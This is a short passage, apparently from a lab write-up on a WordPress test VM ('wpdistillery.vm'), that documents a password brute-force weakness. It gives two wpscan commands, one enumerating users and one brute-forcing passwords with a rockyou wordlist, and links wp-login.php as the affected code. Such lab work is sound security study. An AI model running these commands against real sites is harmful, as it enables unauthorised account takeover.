...
3. (Required) Vulnerability Name or ID : Password Brute Force Attack
  ...
  <li> use token to find users : </li>
     $ wpscan --url wpdistillery.vm -e u vp --api-token <token name> </li>
  <li> use token to find password using rockyou-75.txt file: </li>
    $ wpscan --url wpdistillery.vm -e u --passwords /home/kali/Desktop/rockyou-75.txt --api-token <token name>
</ul>
  - [ ] Affected source code: <br />
    - [Link 1](https://github.com/WordPress/WordPress/blob/master/wp-login.php) <br />
